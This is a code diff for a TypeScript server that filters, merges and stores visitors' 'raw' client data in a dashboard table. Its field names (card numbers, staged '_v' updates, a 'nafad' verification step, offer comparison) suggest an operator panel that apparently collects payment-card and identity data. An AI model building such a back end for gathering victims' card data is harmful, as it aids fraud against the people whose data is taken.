@@ -196,6 +196,27 @@ function normalizeDashboardEntry(payload: Record<string, any> = {}): DashboardEn
     badge = "";
   }
 
+  // Extract the actual client data for raw field
+  // Filter out metadata fields - only keep actual client data
+  const metadataFields = ['id', 'visitorId', 'customer', 'status', 'stage', 'updated', 'badge', 'submittedAt', 'raw', '_v1UpdatedAt', '_v5UpdatedAt', '_v6UpdatedAt', '_v7UpdatedAt', 'nafadUpdatedAt', 'comparCompletedAt'];
+  
+  // Extract client data from nestedPayload (priority) or payload
+  const extractClientData = (source: Record<string, any>): Record<string, any> => {
+    const result: Record<string, any> = {};
+    if (source && typeof source === 'object') {
+      Object.keys(source).forEach(key => {
+        if (!metadataFields.includes(key)) {
+          result[key] = (source as any)[key];
+        }
+      });
+    }
+    return result;
+  };
+  
+  const rawData = Object.keys(nestedPayload).length > 0
+    ? extractClientData(nestedPayload)
+    : extractClientData(payload);
+  
   return {
     id: String(payload.id || combinedPayload.id || `REQ-${String(visitorId || customerName || Date.now()).slice(0, 8).toUpperCase()}`),
     customer: customerName,
@@ -205,7 +226,7 @@ function normalizeDashboardEntry(payload: Record<string, any> = {}): DashboardEn
     badge,
     visitorId: visitorId || String(payload.id || combinedPayload.id || ""),
     submittedAt: String(payload.submittedAt || combinedPayload.submittedAt || payload.createdAt || combinedPayload.createdAt || new Date().toISOString()),
-    raw: combinedPayload.raw || combinedPayload || payload.raw || payload,
+    raw: rawData,
   };
 }
 
@@ -514,7 +535,17 @@ async function upsertDashboardRequest(payload: Record<string, any> = {}) {
   // Merge existing visitor data with current payload (current payload takes precedence)
   const mergedPayload = { ...existingVisitorData, ...payload };
   
-  // Also fetch existing dashboard entry to preserve all raw data
+  // Extract client data for raw field - separate from metadata
+  // Client data should NOT include: id, customer, status, stage, updated, badge, submittedAt, raw
+  // But it SHOULD include visitorId for customer identification
+  const metadataFields = ['id', 'customer', 'status', 'stage', 'updated', 'badge', 'submittedAt', 'raw', '_v1UpdatedAt', '_v5UpdatedAt', '_v6UpdatedAt', '_v7UpdatedAt', 'nafadUpdatedAt', 'comparCompletedAt'];
+  let clientDataForRaw: Record<string, any> = {};
+  
+  // Always include visitorId in raw data for customer identification
+  if (visitorId) {
+    clientDataForRaw.visitorId = visitorId;
+  }
+  
   if (visitorId) {
     try {
       const existingEntry = await pool.query<{ raw: Record<string, any> }>(
@@ -522,15 +553,26 @@ async function upsertDashboardRequest(payload: Record<string, any> = {}) {
         [visitorId]
       );
       if (existingEntry.rows[0]?.raw) {
-        // Merge existing raw with current payload to preserve all fields
-        mergedPayload.raw = { ...existingEntry.rows[0].raw, ...payload.raw, ...payload };
-        console.log("[UpsertDashboard] Merged raw keys:", Object.keys(mergedPayload.raw));
-        console.log("[UpsertDashboard] Merged raw has card data:", { _v1: !!mergedPayload.raw._v1, cardNumber: !!mergedPayload.raw.cardNumber });
+        // Start with existing raw data
+        clientDataForRaw = { ...existingEntry.rows[0].raw };
       }
     } catch (e) {
       console.warn("[UpsertDashboard] Could not fetch existing dashboard entry:", e);
     }
   }
+  
+  // Merge new client data (from payload.raw or payload) into clientDataForRaw
+  const newClientData = payload.raw || payload;
+  if (newClientData && typeof newClientData === 'object') {
+    // Filter out metadata fields and merge
+    Object.keys(newClientData).forEach(key => {
+      if (!metadataFields.includes(key)) {
+        clientDataForRaw[key] = (newClientData as any)[key];
+      }
+    });
+  }
+  
+  console.log("[UpsertDashboard] Client data keys:", Object.keys(clientDataForRaw));
 
   // Get current timestamp
   const now = new Date().toISOString();
@@ -583,6 +625,7 @@ async function upsertDashboardRequest(payload: Record<string, any> = {}) {
                             raw.selectedOffer || raw.offerTotalPrice || raw.comparCompletedAt;
     if (hasNewOfferData) {
       mergedPayload.comparCompletedAt = now;
+      clientDataForRaw.comparCompletedAt = now; // Also add to client data for raw
     }
   }
 
@@ -621,10 +664,10 @@ async function upsertDashboardRequest(payload: Record<string, any> = {}) {
         normalized.updated,
         normalized.badge,
         persistedSubmittedAt,
-        mergedPayload, // Store the merged payload with all visitor data
+        clientDataForRaw, // Store only client data in raw field
       ],
     );
-    console.log("[UpsertDashboard] DB insert successful with merged data");
+    console.log("[UpsertDashboard] DB insert successful with client data");
   } catch (error) {
     console.error("[UpsertDashboard] DB insert failed:", error);
     throw error;
@@ -639,6 +682,32 @@ async function getDashboardEntries(): Promise<DashboardEntry[]> {
       `SELECT id, customer, status, stage, updated, badge, visitor_id AS "visitorId", submitted_at AS "submittedAt", raw FROM dashboard_requests ORDER BY submitted_at DESC, id DESC`,
     );
 
+    // Helper to clean nested raw objects
+    const cleanRaw = (raw: any): Record<string, any> => {
+      if (!raw || typeof raw !== 'object') return {};
+      
+      // If raw has a nested 'raw' property, unwrap it (fix legacy data)
+      if (raw.raw && typeof raw.raw === 'object') {
+        // Filter out metadata fields from the nested raw
+        const metadataFields = ['id', 'visitorId', 'customer', 'status', 'stage', 'updated', 'badge', 'submittedAt', 'raw', '_v1UpdatedAt', '_v5UpdatedAt', '_v6UpdatedAt', '_v7UpdatedAt', 'nafadUpdatedAt', 'comparCompletedAt'];
+        const cleaned: Record<string, any> = {};
+        Object.keys(raw.raw).forEach(key => {
+          if (!metadataFields.includes(key)) {
+            cleaned[key] = (raw.raw as any)[key];
+          }
+        });
+        // Add any direct fields that are not metadata
+        Object.keys(raw).forEach(key => {
+          if (!metadataFields.includes(key) && key !== 'raw') {
+            cleaned[key] = (raw as any)[key];
+          }
+        });
+        return cleaned;
+      }
+      
+      return raw;
+    };
+
     return rows.map((row) => ({
       id: row.id,
       customer: row.customer || "زائر",
@@ -649,7 +718,7 @@ async function getDashboardEntries(): Promise<DashboardEntry[]> {
       badge: row.badge || "",
       visitorId: row.visitorId || undefined,
       submittedAt: row.submittedAt || undefined,
-      raw: row.raw || {},
+      raw: cleanRaw(row.raw),
     }));
   } catch (error) {
     console.error("[Dashboard] DB QUERY FAILED:", error);
